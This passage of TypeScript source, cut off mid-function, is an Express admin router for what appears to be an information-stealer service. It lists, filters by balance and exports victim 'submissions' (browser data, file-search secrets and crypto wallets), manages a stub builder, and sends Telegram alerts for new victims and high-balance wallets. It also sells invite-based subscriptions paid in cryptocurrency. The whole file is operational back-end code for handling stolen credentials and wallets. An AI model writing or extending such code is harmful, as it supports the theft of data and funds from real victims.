import express from 'express';
import { AuthenticatedRequest, requireAdmin, requireAdminHTML } from '../middleware/auth';
import { UserService } from '../services/userService';
import {
  SubmissionService,
  SubmissionType,
  getBrowserSubmissionsAll,
  getDashboardSubmissionsAll,
} from '../services/submissionService';
import { Logger } from '../utils/logger';
import { TelegramService } from '../services/telegram/telegramService';
import { StubBuilderConfigService } from '../services/stubBuilderConfigService';
import { StubBuilderService } from '../services/stubBuilder/stubBuilderService';
import { TelegramResetService } from '../services/telegram/resetService';
import { startResetBot, stopResetBot, getResetBotStatus } from '../services/telegram/resetWorker';
import { db } from '../db/connection';
import { eq, inArray, desc, and, gte, lte, sql } from 'drizzle-orm';
import { sessions, userTelegram, globalAnnouncements } from '../db/schema/other';
import { users } from '../db/schema/users';
import { PaymentService } from '../services/paymentService';

const router = express.Router();

// Local helpers: normalize payment rows to snake_case + ISO dates for admin APIs
const toISO = (v: any): string | null => {
  if (!v) return null;
  const d = v instanceof Date ? v : new Date(v);
  return isNaN(d.getTime()) ? null : d.toISOString();
};

const mapPaymentToSnake = (row: any) => ({
  id: row.id,
  user_id: row.userId ?? row.user_id ?? null,
  subscription_id: row.subscriptionId ?? row.subscription_id ?? null,
  amount: typeof row.amount === 'number' ? row.amount.toString() : (row.amount ?? null),
  currency: row.currency ?? null,
  status: row.status ?? null,
  oxapay_track_id: row.oxapayTrackId ?? row.oxapay_track_id ?? null,
  oxapay_txid: row.oxapayTxid ?? row.oxapay_txid ?? null,
  payment_link: row.paymentLink ?? row.payment_link ?? null,
  expires_at: toISO(row.expiresAt ?? row.expires_at),
  payment_type: row.paymentType ?? row.payment_type ?? null,
  invite_count: row.inviteCount ?? row.invite_count ?? null,
  created_at: toISO(row.createdAt ?? row.created_at),
  username: row.username ?? null,
});

// Normalize user rows to snake_case for admin UI
const toNumBool = (v: any): number => (v ? 1 : 0);
const mapUserToSnake = (u: any) => ({
  id: u.id,
  username: u.username,
  is_admin: toNumBool(u.isAdmin ?? u.is_admin),
  created_at: toISO(u.createdAt ?? u.created_at),
  last_login: toISO(u.lastLogin ?? u.last_login),
  ip_address: u.ipAddress ?? u.ip_address ?? '',
  invited_by: u.invitedBy ?? u.invited_by ?? null,
  invites_created: Number(u.invitesCreated ?? u.invites_created ?? 0),
  users_invited: Number(u.usersInvited ?? u.users_invited ?? 0),
  has_active_subscription: toNumBool(u.hasActiveSubscription ?? u.has_active_subscription ?? false),
  subscription_end_date: u.subscriptionEndDate ?? u.subscription_end_date ?? null,
  telegram_username: u.telegram_username ?? null,
  telegram_user_id: u.telegram_user_id ?? null,
});

// Admin UI is a separate frontend. Keep the root as an API auth-check endpoint.
router.get('/', requireAdmin, (_req, res) => {
  res.json({
    message: 'Admin frontend is served separately. This endpoint verifies admin authentication.',
  });
});

// Get all users
router.get('/api/users', requireAdmin, async (req, res) => {
  try {
    const { username, subscriptionStatus, lastLoginAfter, lastLoginBefore } = req.query as any;
    const search = (username && String(username).trim().toLowerCase()) || '';

    const hasFilters = search || subscriptionStatus || lastLoginAfter || lastLoginBefore;

    let baseUsers;
    if (hasFilters) {
      baseUsers = await UserService.filterUsers({
        username: search || undefined,
        subscriptionStatus: (subscriptionStatus as 'active' | 'inactive') || undefined,
        lastLoginAfter: (lastLoginAfter as string) || undefined,
        lastLoginBefore: (lastLoginBefore as string) || undefined,
      });
    } else {
      baseUsers = await UserService.getAllUsersWithInviteStats();
    }

    // Fetch telegram linkage for all user ids
    const userIds = baseUsers.map((u: any) => u.id);
    let telegramRows: any[] = [];
    if (userIds.length) {
      telegramRows = await db
        .select({
          user_id: userTelegram.userId,
          telegram_username: userTelegram.telegramUsername,
          telegram_user_id: userTelegram.telegramUserId,
        })
        .from(userTelegram)
        .where(inArray(userTelegram.userId, userIds));
    }
    const tgMap = new Map<number, any>();
    telegramRows.forEach((r) => tgMap.set(r.user_id, r));

    const enriched = baseUsers.map((u: any) => ({
      ...u,
      telegram_username: tgMap.get(u.id)?.telegram_username || null,
      telegram_user_id: tgMap.get(u.id)?.telegram_user_id || null,
    }));

    // Normalize to snake_case for frontend
    const normalized = enriched.map(mapUserToSnake);

    // If search provided, also match ip_address and telegram_username locally (since filterUsers only did username)
    let finalUsers = normalized;
    if (search) {
      finalUsers = normalized.filter((u) => {
        const ip = (u.ip_address || '').toLowerCase();
        const tg = (u.telegram_username || '').toLowerCase();
        const uname = (u.username || '').toLowerCase();
        return uname.includes(search) || ip.includes(search) || tg.includes(search);
      });
    }

    res.json({ users: finalUsers });
  } catch (error: any) {
    res.status(500).json({ error: error.message || 'Failed to load users' });
  }
});

// Get all submissions
router.get('/api/submissions', requireAdmin, async (req, res) => {
  try {
    const { type, userId } = req.query;
    let submissions;

    if (type) {
      submissions = await SubmissionService.getSubmissionsByType(type as SubmissionType);
    } else {
      submissions = await SubmissionService.getAllSubmissions();
    }

    if (userId) {
      submissions = submissions.filter((s) => s.user_id === userId);
    }

    res.json({ submissions });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Get submissions statistics - for the React admin panel
router.get('/api/submissions/stats', requireAdmin, async (_req, res) => {
  try {
    const stats = await SubmissionService.getSubmissionStats();
    res.json({ stats });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Get all submissions with pagination and filters - unified view
router.get('/api/submissions/all', requireAdmin, async (req, res) => {
  try {
    const { page = 1, pageSize = 10, search, type, username } = req.query;

    const pageNum = parseInt(page.toString());
    const pageSizeNum = parseInt(pageSize.toString());

    // Get all data from different submission types
    const allData = await getDashboardSubmissionsAll();
    const browserSubmissions = await getBrowserSubmissionsAll();

    let allSubmissions: any[] = [];

    // Add browser submissions
    if (!type || type === 'browser') {
      const browserItems = browserSubmissions.map((item: any) => ({
        ...item,
        type: 'browser',
        created_at: item.created_at || item.submission_date,
      }));
      allSubmissions.push(...browserItems);
    }

    // Add filesearch submissions
    if (!type || type === 'filesearch') {
      const filesearchItems = (allData.filesearch || []).map((item: any) => ({
        ...item,
        type: 'filesearch',
        created_at: item.created_at || item.submission_date,
      }));
      allSubmissions.push(...filesearchItems);
    }

    // Add wallet submissions
    if (!type || type === 'wallets') {
      const walletItems = (allData.wallets || []).map((item: any) => ({
        ...item,
        type: 'wallets',
        created_at: item.created_at || item.submission_date,
      }));
      allSubmissions.push(...walletItems);
    }

    // Apply filters
    if (search) {
      const searchTerm = search.toString().toLowerCase();
      allSubmissions = allSubmissions.filter((s: any) => {
        const searchableText = JSON.stringify({
          username: s.username,
          browser: s.browser,
          data_type: s.data_type,
          file_extension: s.file_extension,
          wallet_type: s.wallet_type,
          address: s.address,
        }).toLowerCase();
        return searchableText.includes(searchTerm);
      });
    }

    if (username) {
      const usernameTerm = username.toString().toLowerCase();
      allSubmissions = allSubmissions.filter((s: any) =>
        (s.username || '').toLowerCase().includes(usernameTerm),
      );
    }

    // Sort by date (newest first)
    allSubmissions.sort((a, b) => {
      const dateA = new Date(a.created_at || 0).getTime();
      const dateB = new Date(b.created_at || 0).getTime();
      return dateB - dateA;
    });

    // Pagination
    const startIndex = (pageNum - 1) * pageSizeNum;
    const endIndex = startIndex + pageSizeNum;
    const paginatedSubmissions = allSubmissions.slice(startIndex, endIndex);

    res.json({
      submissions: paginatedSubmissions,
      total: allSubmissions.length,
      currentPage: pageNum,
      totalPages: Math.ceil(allSubmissions.length / pageSizeNum),
    });
  } catch (error: any) {
    Logger.error('Error loading all submissions:', error);
    res.status(500).json({ error: error.message });
  }
});

// Get browser submissions with pagination and filters
router.get('/api/submissions/browser', requireAdmin, async (req, res) => {
  try {
    const { page = 1, limit = 50, search, userId } = req.query;
    let submissions = await getBrowserSubmissionsAll();

    // Apply filters
    if (search) {
      const searchTerm = search.toString().toLowerCase();
      submissions = submissions.filter((s: any) =>
        JSON.stringify(s).toLowerCase().includes(searchTerm),
      );
    }

    if (userId) {
      submissions = submissions.filter((s: any) => s.user_id == userId);
    }

    // Pagination
    const pageNum = parseInt(page.toString());
    const limitNum = parseInt(limit.toString());
    const startIndex = (pageNum - 1) * limitNum;
    const endIndex = startIndex + limitNum;
    const paginatedSubmissions = submissions.slice(startIndex, endIndex);

    res.json({
      submissions: paginatedSubmissions,
      total: submissions.length,
      page: pageNum,
      totalPages: Math.ceil(submissions.length / limitNum),
    });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Get filesearch submissions with pagination and filters
router.get('/api/submissions/filesearch', requireAdmin, async (req, res) => {
  try {
    const { page = 1, limit = 50, search, userId, minBalance } = req.query;
    const allData = await getDashboardSubmissionsAll();
    let submissions = allData.filesearch;

    // Apply filters
    if (search) {
      const searchTerm = search.toString().toLowerCase();
      submissions = submissions.filter((s: any) =>
        JSON.stringify(s).toLowerCase().includes(searchTerm),
      );
    }

    if (userId) {
      submissions = submissions.filter((s: any) => s.user_id == userId);
    }

    if (minBalance) {
      const minBal = parseFloat(minBalance.toString());
      if (!isNaN(minBal)) {
        submissions = submissions.filter((s: any) => {
          try {
            const data = typeof s.data === 'string' ? JSON.parse(s.data) : s.data;
            return (data?.balance || 0) >= minBal;
          } catch {
            return false;
          }
        });
      }
    }

    // Pagination
    const pageNum = parseInt(page.toString());
    const limitNum = parseInt(limit.toString());
    const startIndex = (pageNum - 1) * limitNum;
    const endIndex = startIndex + limitNum;
    const paginatedSubmissions = submissions.slice(startIndex, endIndex);

    res.json({
      submissions: paginatedSubmissions,
      total: submissions.length,
      page: pageNum,
      totalPages: Math.ceil(submissions.length / limitNum),
    });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Get wallet submissions with pagination and filters
router.get('/api/submissions/wallets', requireAdmin, async (req, res) => {
  try {
    const { page = 1, limit = 50, search, userId, minBalance } = req.query;
    const allData = await getDashboardSubmissionsAll();
    let submissions = allData.wallets;

    // Apply filters
    if (search) {
      const searchTerm = search.toString().toLowerCase();
      submissions = submissions.filter((s: any) =>
        JSON.stringify(s).toLowerCase().includes(searchTerm),
      );
    }

    if (userId) {
      submissions = submissions.filter((s: any) => s.user_id == userId);
    }

    if (minBalance) {
      const minBal = parseFloat(minBalance.toString());
      if (!isNaN(minBal)) {
        submissions = submissions.filter((s: any) => (s.balance_usd || 0) >= minBal);
      }
    }

    // Pagination
    const pageNum = parseInt(page.toString());
    const limitNum = parseInt(limit.toString());
    const startIndex = (pageNum - 1) * limitNum;
    const endIndex = startIndex + limitNum;
    const paginatedSubmissions = submissions.slice(startIndex, endIndex);

    res.json({
      submissions: paginatedSubmissions,
      total: submissions.length,
      page: pageNum,
      totalPages: Math.ceil(submissions.length / limitNum),
    });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Export submissions by type
router.get('/api/submissions/export/:type', requireAdmin, async (req, res) => {
  try {
    const { type } = req.params;
    const { format = 'json' } = req.query;

    let data: any[] = [];
    let filename = '';

    switch (type) {
      case 'browser':
        data = await getBrowserSubmissionsAll();
        filename = `browser_submissions_${new Date().toISOString().split('T')[0]}`;
        break;
      case 'filesearch':
        const filesearchData = await getDashboardSubmissionsAll();
        data = filesearchData.filesearch;
        filename = `filesearch_submissions_${new Date().toISOString().split('T')[0]}`;
        break;
      case 'wallets':
        const walletsData = await getDashboardSubmissionsAll();
        data = walletsData.wallets;
        filename = `wallet_submissions_${new Date().toISOString().split('T')[0]}`;
        break;
      default:
        return res.status(400).json({ error: 'Invalid submission type' });
    }

    if (format === 'csv') {
      const csv = convertToCSV(data);
      res.setHeader('Content-Type', 'text/csv');
      res.setHeader('Content-Disposition', `attachment; filename="${filename}.csv"`);
      res.send(csv);
    } else {
      res.setHeader('Content-Type', 'application/json');
      res.setHeader('Content-Disposition', `attachment; filename="${filename}.json"`);
      res.json(data);
    }
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Get all invites
router.get('/api/invites', requireAdmin, async (_req, res) => {
  try {
    const invites = await UserService.getAllInvites();
    res.json({ invites });
  } catch (error: any) {
    Logger.error('Failed to load invites in admin panel', {
      error: error.message,
    });
    res.status(500).json({ error: error.message || 'Failed to load invites' });
  }
});

// Get user list for invite assignment
router.get('/api/users/list', requireAdmin, async (_req, res) => {
  try {
    const users = await UserService.getAllUsersWithInviteStats();
    // Return simplified user list with just id, username, and email
    const userList = users.map((user: any) => ({
      id: user.id,
      username: user.username,
      email: user.email,
      created_at: user.created_at,
    }));
    res.json({ users: userList });
  } catch (error: any) {
    res.status(500).json({ error: error.message || 'Failed to load user list' });
  }
});

// Create invite for user
router.post('/api/invites', requireAdmin, async (req: AuthenticatedRequest, res) => {
  try {
    const { targetUserId } = req.body;
    const createdBy = req.user!.id;

    if (targetUserId) {
      // Assign invite to specific user (includes notification)
      const result = await UserService.assignInviteToUser(targetUserId, createdBy);

      res.json({
        message: `Invite assigned to ${result.targetUsername} successfully`,
        code: result.code,
      });
    } else {
      // Create general invite
      const code = await UserService.createInvite(createdBy);
      res.json({ message: 'Invite created successfully', code });
    }
  } catch (error: any) {
    console.error('Admin invite creation error:', error);
    res.status(500).json({ error: error.message || 'Failed to process invite request' });
  }
});

// Bulk create invites
router.post('/api/invites/bulk', requireAdmin, async (req: AuthenticatedRequest, res) => {
  try {
    const { count, subscription_type } = req.body;
    const createdBy = req.user!.id;

    const inviteCodes: string[] = [];

    for (let i = 0; i < count; i++) {
      const code = await UserService.createBulkInvite(createdBy, subscription_type);
      inviteCodes.push(code);
    }

    res.json({
      message: `${count} invites created successfully`,
      created_count: count,
      invite_codes: inviteCodes,
    });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Assign invite to user
router.post('/api/invites/assign', requireAdmin, async (req: AuthenticatedRequest, res) => {
  try {
    const { targetUserId, subscription_type } = req.body;
    const createdBy = req.user!.id;

    if (!targetUserId) {
      return res.status(400).json({ error: 'Target user ID is required' });
    }

    const result = await UserService.assignInviteToUser(targetUserId, createdBy);

    res.json({
      message: `Invite assigned to ${result.targetUsername} successfully`,
      code: result.code,
      invite: result,
    });
  } catch (error: any) {
    console.error('Admin invite assignment error:', error);
    res.status(500).json({ error: error.message || 'Failed to assign invite' });
  }
});

// Reset user password
router.post('/api/users/:id/reset-password', requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const { newPassword } = req.body;

    await UserService.adminUpdatePassword(parseInt(id), newPassword);
    res.json({ message: 'Password reset successfully' });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Unlink a user's Telegram association
router.post('/api/users/:id/telegram/unlink', requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const userId = parseInt(id);
    if (isNaN(userId)) return res.status(400).json({ error: 'Invalid user id' });

    await db.delete(userTelegram).where(eq(userTelegram.userId, userId));

    res.json({ success: true, unlinked: true, user_id: userId });
  } catch (error: any) {
    Logger.error('Admin unlink telegram failed', {
      error: error?.message,
      stack: error?.stack,
    });
    res.status(500).json({ error: 'Failed to unlink telegram' });
  }
});

// Revoke invite
router.post('/api/invites/:id/revoke', requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    await UserService.revokeInvite(parseInt(id));
    res.json({ message: 'Invite revoked successfully' });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Delete invite
router.delete('/api/invites/:id', requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    await UserService.deleteInvite(parseInt(id));
    res.json({ message: 'Invite deleted successfully' });
  } catch (error: any) {
    if (error.message === 'Cannot delete used invites') {
      return res.status(400).json({ error: 'Cannot delete invites that have already been used' });
    }
    res.status(500).json({ error: error.message });
  }
});

// Delete user
router.delete('/api/users/:id', requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const userId = parseInt(id);
    await UserService.deleteUser(userId);
    // Best-effort: remove active sessions for that user so they can't continue using stale cookie
    // Note: sessions table doesn't have userId column, so we can't clean up sessions by user
    // Sessions will expire naturally or can be cleaned up separately
    res.json({ message: 'User soft-deleted successfully' });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Get dashboard stats
router.get('/api/stats', requireAdmin, async (_req, res) => {
  try {
    const stats = await SubmissionService.getSubmissionStats();
    res.json({ stats });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

/**
 * Payments & Revenue Analytics (Admin)
 */

// List payments with filters & pagination
router.get('/api/payments', requireAdmin, async (req, res) => {
  try {
    const {
      status,
      userId,
      trackId,
      paymentType,
      dateFrom,
      dateTo,
      page = '1',
      pageSize = '25',
    } = req.query as any;

    const result = await PaymentService.listPayments({
      status: status ? String(status) : undefined,
      userId: userId ? Number(userId) : undefined,
      trackId: trackId ? String(trackId) : undefined,
      paymentType: paymentType ? String(paymentType) : undefined,
      dateFrom: dateFrom ? String(dateFrom) : undefined,
      dateTo: dateTo ? String(dateTo) : undefined,
      page: Number(page),
      pageSize: Number(pageSize),
    });
    // Normalize to snake_case with ISO dates for frontend
    const normalized = {
      ...result,
      payments: (result.payments || []).map(mapPaymentToSnake),
    };
    res.json(normalized);
  } catch (error: any) {
    res.status(500).json({ error: error.message || 'Failed to list payments' });
  }
});

// Get single payment by id
router.get('/api/payments/:id', requireAdmin, async (req, res) => {
  try {
    const payment = await PaymentService.getPaymentById(Number(req.params.id));
    if (!payment) return res.status(404).json({ error: 'Payment not found' });
    res.json({ payment: mapPaymentToSnake(payment) });
  } catch (error: any) {
    res.status(500).json({ error: error.message || 'Failed to get payment' });
  }
});

// Lookup payment by track ID (includes username)
router.get('/api/payments/track/:trackId', requireAdmin, async (req, res) => {
  try {
    const payment = await PaymentService.getPaymentByTrackIdWithUser(req.params.trackId);
    if (!payment) return res.status(404).json({ error: 'Payment not found' });
    res.json({ payment: mapPaymentToSnake(payment) });
  } catch (error: any) {
    res.status(500).json({ error: error.message || 'Failed to lookup payment' });
  }
});

// User invoices (for user action modal)
router.get('/api/users/:id/payments', requireAdmin, async (req, res) => {
  try {
    const payments = await PaymentService.getUserInvoices(Number(req.params.id));
    res.json({ payments: (payments || []).map(mapPaymentToSnake) });
  } catch (error: any) {
    res.status(500).json({ error: error.message || 'Failed to load user invoices' });
  }
});

// Top spenders
router.get('/api/payments/top-spenders', requireAdmin, async (req, res) => {
  try {
    const limit = req.query.limit ? Number(req.query.limit) : 3;
    const spenders = await PaymentService.getTopSpenders(limit);
    res.json({ spenders });
  } catch (error: any) {
    res.status(500).json({ error: error.message || 'Failed to load top spenders' });
  }
});

// Revenue summary aggregates
router.get('/api/payments/revenue/summary', requireAdmin, async (_req, res) => {
  try {
    const summary = await PaymentService.getRevenueSummary();
    // Keep keys as-is but ensure numbers are numbers
    res.json({ summary });
  } catch (error: any) {
    res.status(500).json({ error: error.message || 'Failed to load revenue summary' });
  }
});

// Revenue time-series (daily) - ?days=30 default
router.get('/api/payments/revenue/timeseries', requireAdmin, async (req, res) => {
  try {
    const days = req.query.days ? Number(req.query.days) : 30;
    const timeseries = await PaymentService.getRevenueTimeseries(days);
    // Already returns normalized numbers and YYYY-MM-DD days
    res.json({ timeseries, days });
  } catch (error: any) {
    res.status(500).json({ error: error.message || 'Failed to load revenue timeseries' });
  }
});

// Recent invoices
router.get('/api/payments/recent', requireAdmin, async (req, res) => {
  try {
    const limit = req.query.limit ? Number(req.query.limit) : 20;
    const invoices = await PaymentService.getRecentInvoices(limit);
    res.json({ invoices: (invoices || []).map(mapPaymentToSnake) });
  } catch (error: any) {
    res.status(500).json({ error: error.message || 'Failed to load recent invoices' });
  }
});

// Get detailed dashboard submissions data
router.get('/api/submissions/details', requireAdmin, async (_req, res) => {
  try {
    const submissions = await SubmissionService.getAllSubmissions();
    const detailedSubmissions = await Promise.all(
      submissions.map(async (submission) => {
        const user = await UserService.getUserById(submission.user_id);
        return {
          ...submission,
          user_username: user?.username || null,
        };
      }),
    );

    res.json({ submissions: detailedSubmissions });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

// Grant subscription to user
router.post('/api/users/:id/grant-subscription', requireAdmin, async (req, res) => {
  try {
    const { id } = req.params;
    const { subscription_type } = req.body;

    const { SubscriptionService } = await import('../services/subscriptionService');

    // Check if user exists
    const user = await UserService.getUserById(parseInt(id));
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    // Create subscription for the user
    const subscription = await SubscriptionService.createSubscription(
      parseInt(id),
      subscription_type as 'WEEK' | 'MONTH' | 'THREE_MONTHS',
    );

    res.json({
      message: 'Subscription granted successfully',
      subscription,
    });
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

/**
 * GET /admin/api/telegram/config
 * Get Telegram configuration
 */
router.get('/api/telegram/config', requireAdmin, async (req, res) => {
  try {
    const config = await TelegramService.getConfig();

    // Don't send bot token in response for security
    const safeConfig = {
      ...config,
      bot_token: config.bot_token ? '***configured***' : null,
    };

    res.json({ config: safeConfig });
  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : 'Failed to get Telegram config';
    res.status(500).json({ error: errorMessage });
  }
});

/**
 * POST /admin/api/telegram/config
 * Update Telegram configuration
 */
router.post('/api/telegram/config', requireAdmin, async (req, res) => {
  try {
    const {
      bot_token,
      channel_id,
      notifications_enabled,
      notify_new_client,
      notify_new_wallet,
      notify_high_balance_secrets,
      notify_high_balance_wallet,
      notify_payments,
      high_balance_threshold,
    } = req.body;

    const config: Partial<typeof req.body> = {};

    if (bot_token !== undefined) config.bot_token = bot_token || null;
    if (channel_id !== undefined) config.channel_id = channel_id || null;
    if (notifications_enabled !== undefined)
      config.notifications_enabled = Boolean(notifications_enabled);
    if (notify_new_client !== undefined) config.notify_new_client = Boolean(notify_new_client);
    if (notify_new_wallet !== undefined) config.notify_new_wallet = Boolean(notify_new_wallet);
    if (notify_high_balance_secrets !== undefined)
      config.notify_high_balance_secrets = Boolean(notify_high_balance_secrets);
    if (notify_high_balance_wallet !== undefined)
      config.notify_high_balance_wallet = Boolean(notify_high_balance_wallet);
    if (notify_payments !== undefined) config.notify_payments = Boolean(notify_payments);
    if (high_balance_threshold !== undefined) {
      const threshold = Number(high_balance_threshold);
      config.high_balance_threshold = isNaN(threshold) || threshold < 0 ? 100 : threshold;
    }

    await TelegramService.updateConfig(config);

    res.json({ message: 'Telegram configuration updated successfully' });
  } catch (error: unknown) {
    const errorMessage =
      error instanceof Error ? error.message : 'Failed to update Telegram config';
    res.status(500).json({ error: errorMessage });
  }
});

// Password reset bot config (separate bot)
router.get('/api/reset-bot/config', requireAdmin, async (_req, res) => {
  try {
    const cfg = await TelegramResetService.getConfig();
    res.json({
      config: {
        enabled: cfg.enabled,
        bot_username: cfg.bot_username,
        bot_token: cfg.bot_token ? '***configured***' : null,
        has_token: !!cfg.bot_token, // Indicate if token exists without exposing it
        poll_interval: 1000, // Fixed value since it's not configurable yet
      },
    });
  } catch (e: any) {
    Logger.error('Reset bot config load error', { error: e.message });
    res.status(500).json({ error: e.message || 'Failed to load reset bot config' });
  }
});

router.post('/api/reset-bot/config', requireAdmin, async (req, res) => {
  try {
    const { bot_token, enabled, poll_interval } = req.body || {};

    // Validate inputs
    if (bot_token !== undefined && typeof bot_token !== 'string') {
      return res.status(400).json({ error: 'Bot token must be a string' });
    }

    if (enabled !== undefined && typeof enabled !== 'boolean') {
      return res.status(400).json({ error: 'Enabled must be a boolean' });
    }

    // Validate poll_interval if provided (though not used in current implementation)
    if (poll_interval !== undefined) {
      if (typeof poll_interval !== 'number' || poll_interval < 500 || poll_interval > 10000) {
        return res.status(400).json({ error: 'Poll interval must be between 500ms and 10000ms' });
      }
    }

    const update: any = {};
    if (bot_token !== undefined && bot_token !== '') update.bot_token = bot_token || null;
    if (enabled !== undefined) update.enabled = !!enabled;

    // If bot_token provided attempt to fetch username
    if (bot_token && bot_token.trim()) {
      const test = await TelegramResetService.testToken(bot_token.trim());
      if (!test.success) {
        return res.status(400).json({ error: test.error || 'Invalid bot token' });
      }
      update.bot_username = test.username || null;
    }

    await TelegramResetService.updateConfig(update);
    res.json({
      message: 'Reset bot config saved',
      bot_username: update.bot_username,
      config: {
        enabled: update.enabled,
        bot_username: update.bot_username,
        bot_token: update.bot_token ? '***configured***' : null,
      },
    });
  } catch (e: any) {
    Logger.error('Reset bot config save error', { error: e.message });
    res.status(500).json({ error: e.message || 'Failed to save reset bot config' });
  }
});

router.post('/api/reset-bot/start', requireAdmin, async (_req, res) => {
  try {
    const started = await startResetBot();
    res.json({ started, status: getResetBotStatus() });
  } catch (e: any) {
    res.status(500).json({ error: e.message || 'Failed to start reset bot' });
  }
});

router.post('/api/reset-bot/stop', requireAdmin, async (_req, res) => {
  try {
    const stopped = await stopResetBot();
    res.json({ stopped, status: getResetBotStatus() });
  } catch (e: any) {
    res.status(500).json({ error: e.message || 'Failed to stop reset bot' });
  }
});

router.get('/api/reset-bot/status', requireAdmin, async (_req, res) => {
  try {
    res.json({ status: getResetBotStatus() });
  } catch (e: any) {
    res.status(500).json({ error: e.message || 'Failed to get reset bot status' });
  }
});

// Legacy reset bot endpoints (keeping for backwards compatibility)
router.get('/api/telegram/reset-config', requireAdmin, async (_req, res) => {
  try {
    const cfg = await TelegramResetService.getConfig();
    res.json({
      config: {
        enabled: cfg.enabled,
        bot_username: cfg.bot_username,
        bot_token: cfg.bot_token ? '***configured***' : null,
      },
    });
  } catch (e: any) {
    res.status(500).json({ error: e.message || 'Failed to load reset bot config' });
  }
});

router.post('/api/telegram/reset-config', requireAdmin, async (req, res) => {
  try {
    const { bot_token, enabled } = req.body || {};
    const update: any = {};
    if (bot_token !== undefined && bot_token !== '') update.bot_token = bot_token || null;
    if (enabled !== undefined) update.enabled = !!enabled;
    // If bot_token provided attempt to fetch username
    if (bot_token) {
      const test = await TelegramResetService.testToken(bot_token);
      if (!test.success) return res.status(400).json({ error: test.error || 'Invalid bot token' });
      update.bot_username = test.username || null;
    }
    await TelegramResetService.updateConfig(update);
    res.json({ message: 'Reset bot config saved', bot_username: update.bot_username });
  } catch (e: any) {
    res.status(500).json({ error: e.message || 'Failed to save reset bot config' });
  }
});

router.post('/api/telegram/reset-bot/start', requireAdmin, async (_req, res) => {
  try {
    const started = await startResetBot();
    res.json({ started, status: getResetBotStatus() });
  } catch (e: any) {
    res.status(500).json({ error: e.message || 'Failed to start reset bot' });
  }
});

router.post('/api/telegram/reset-bot/stop', requireAdmin, async (_req, res) => {
  try {
    const stopped = await stopResetBot();
    res.json({ stopped, status: getResetBotStatus() });
  } catch (e: any) {
    res.status(500).json({ error: e.message || 'Failed to stop reset bot' });
  }
});

router.get('/api/telegram/reset-bot/status', requireAdmin, async (_req, res) => {
  try {
    res.json({ status: getResetBotStatus() });
  } catch (e: any) {
    res.status(500).json({ error: e.message || 'Failed to get reset bot status' });
  }
});

/**
 * POST /admin/api/telegram/test
 * Test Telegram bot connection
 */
router.post('/api/telegram/test', requireAdmin, async (req, res) => {
  try {
    const { bot_token } = req.body;

    if (!bot_token) {
      return res.status(400).json({ error: 'Bot token is required' });
    }

    const result = await TelegramService.testConnection(bot_token);
    res.json(result);
  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : 'Test failed';
    res.status(500).json({ error: errorMessage });
  }
});

/**
 * POST /admin/api/telegram/test-message
 * Send test message to Telegram
 */
router.post('/api/telegram/test-message', requireAdmin, async (req, res) => {
  try {
    const { message = 'This is a test message from Flipper Admin Panel! 🎉' } = req.body;

    const success = await TelegramService.sendMessage(
      `${message}\n\n<i>Timestamp: ${new Date().toLocaleString()}</i>`,
    );

    if (success) {
      res.json({ message: 'Test message sent successfully!' });
    } else {
      res.status(500).json({ error: 'Failed to send test message. Check your configuration.' });
    }
  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : 'Test message failed';
    res.status(500).json({ error: errorMessage });
  }
});

/**
 * GET /admin/api/telegram/stats
 * Get Telegram notification statistics
 */
router.get('/api/telegram/stats', requireAdmin, async (req, res) => {
  try {
    const stats = await TelegramService.getNotificationStats();
    res.json({ stats });
  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : 'Failed to get Telegram stats';
    res.status(500).json({ error: errorMessage });
  }
});

/**
 * GET /admin/api/announcements (legacy - for current active announcement)
 * Get current global announcement
 */
router.get('/api/announcements/current', requireAdmin, async (req, res) => {
  try {
    const announcement = await db
      .select({
        id: globalAnnouncements.id,
        title: globalAnnouncements.title,
        message: globalAnnouncements.message,
        isActive: globalAnnouncements.isActive,
        isPermanent: globalAnnouncements.isPermanent,
        expiresAt: globalAnnouncements.expiresAt,
        createdAt: globalAnnouncements.createdAt,
        createdBy: globalAnnouncements.createdBy,
        username: users.username,
      })
      .from(globalAnnouncements)
      .leftJoin(users, eq(globalAnnouncements.createdBy, users.id))
      .where(
        and(
          eq(globalAnnouncements.isActive, true),
          sql`(${globalAnnouncements.isPermanent} = true OR ${globalAnnouncements.expiresAt} > NOW())`,
        ),
      )
      .orderBy(desc(globalAnnouncements.createdAt))
      .limit(1);

    res.json({ announcement: announcement[0] || null });
  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : 'Failed to get announcement';
    res.status(500).json({ error: errorMessage });
  }
});

/**
 * POST /admin/api/announcements/legacy
 * Create or update global announcement (legacy endpoint)
 */
router.post('/api/announcements/legacy', requireAdmin, async (req: AuthenticatedRequest, res) => {
  try {
    const { title, message, duration_days } = req.body;

    if (!title || !message) {
      return res.status(400).json({ error: 'Title and message are required' });
    }

    // Deactivate any existing announcements
    await db
      .update(globalAnnouncements)
      .set({ isActive: false })
      .where(eq(globalAnnouncements.isActive, true));

    // Create new announcement
    const isPermanent = !duration_days || duration_days === 0;
    const expiresAt = isPermanent
      ? null
      : new Date(Date.now() + duration_days * 24 * 60 * 60 * 1000);

    const result = await db
      .insert(globalAnnouncements)
      .values({
        title,
        message,
        isActive: true,
        isPermanent,
        expiresAt,
        createdBy: req.user!.id,
      })
      .returning();

